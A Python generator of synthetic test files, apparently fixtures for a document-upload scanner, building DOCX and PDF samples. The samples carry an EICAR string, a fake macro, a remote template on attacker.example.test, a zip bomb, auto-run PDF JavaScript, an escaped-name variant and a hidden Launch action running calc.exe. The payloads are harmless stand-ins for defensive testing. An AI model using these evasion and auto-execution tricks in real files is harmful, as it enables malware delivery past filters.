"""합성 테스트 파일 생성기. 실제 이력서/개인정보는 절대 쓰지 않는다."""

import io
import zipfile
import zlib

EICAR = rb"X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"

CONTENT_TYPES = (
    b'<?xml version="1.0" encoding="UTF-8"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
    b'<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>'
    b'<Default Extension="xml" ContentType="application/xml"/>'
    b'<Override PartName="/word/document.xml" '
    b'ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/></Types>'
)
RELS = (
    b'<?xml version="1.0" encoding="UTF-8"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
    b'<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument"'
    b' Target="word/document.xml"/></Relationships>'
)
DOCUMENT = (
    b'<?xml version="1.0" encoding="UTF-8"?><w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">'
    b"<w:body><w:p><w:r><w:t>synthetic</w:t></w:r></w:p></w:body></w:document>"
)


def raw_docx(extra: dict[str, bytes] | None = None, *, content_types: bytes = CONTENT_TYPES) -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr("[Content_Types].xml", content_types)
        z.writestr("_rels/.rels", RELS)
        z.writestr("word/document.xml", DOCUMENT)
        for name, data in (extra or {}).items():
            z.writestr(name, data)
    return buf.getvalue()


def macro_docx() -> bytes:
    return raw_docx({"word/vbaProject.bin": b"\xd0\xcf\x11\xe0 fake vba"})


def external_template_docx() -> bytes:
    rels = (
        b'<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
        b'<Relationship Id="rId9" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate"'
        b' Target="https://attacker.example.test/t.dotm" TargetMode="External"/></Relationships>'
    )
    return raw_docx({"word/_rels/settings.xml.rels": rels})


def hyperlink_docx() -> bytes:
    rels = (
        b'<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
        b'<Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink"'
        b' Target="https://portfolio.example.test" TargetMode="External"/></Relationships>'
    )
    return raw_docx({"word/_rels/document.xml.rels": rels})


def zip_bomb_docx() -> bytes:
    return raw_docx({"word/media/bomb.xml": b"\0" * (60 * 1024 * 1024)})


def nested_archive_docx() -> bytes:
    return raw_docx({"word/embeddings/inner.zip": raw_docx()})


def build_pdf(objects: list[bytes], root: int = 1) -> bytes:
    out = bytearray(b"%PDF-1.7\n")
    offsets = []
    for i, body in enumerate(objects, start=1):
        offsets.append(len(out))
        out += f"{i} 0 obj\n".encode() + body + b"\nendobj\n"
    xref = len(out)
    out += f"xref\n0 {len(objects) + 1}\n0000000000 65535 f \n".encode()
    for off in offsets:
        out += f"{off:010d} 00000 n \n".encode()
    out += f"trailer\n<< /Size {len(objects) + 1} /Root {root} 0 R >>\nstartxref\n{xref}\n%%EOF\n".encode()
    return bytes(out)


_PAGE = b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 595 842] >>"


def clean_pdf() -> bytes:
    return build_pdf([b"<< /Type /Catalog /Pages 2 0 R >>", b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>", _PAGE])


def js_pdf() -> bytes:
    return build_pdf(
        [
            b"<< /Type /Catalog /Pages 2 0 R /OpenAction 4 0 R >>",
            b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
            _PAGE,
            b"<< /S /JavaScript /JS (app.alert(1)) >>",
        ]
    )


def escaped_name_js_pdf() -> bytes:
    # /JavaScript를 #4A 이스케이프로 숨긴 변형
    return build_pdf(
        [
            b"<< /Type /Catalog /Pages 2 0 R /OpenAction << /S /#4Aava#53cript /#4AS (x) >> >>",
            b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
            _PAGE,
        ]
    )


def objstm_hidden_js_pdf() -> bytes:
    # 압축된 오브젝트 스트림 안에 Launch 액션을 숨긴 변형(원시 바이트 검색으로는 안 보임)
    inner = b"<< /S /Launch /F (calc.exe) >>"
    header = b"5 0 "
    stream = zlib.compress(header + inner)
    objstm = (
        b"<< /Type /ObjStm /N 1 /First %d /Filter /FlateDecode /Length %d >>\nstream\n" % (len(header), len(stream))
        + stream
        + b"\nendstream"
    )
    return build_pdf(
        [
            b"<< /Type /Catalog /Pages 2 0 R /OpenAction 5 0 R >>",
            b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
            _PAGE,
            objstm,
        ]
    )
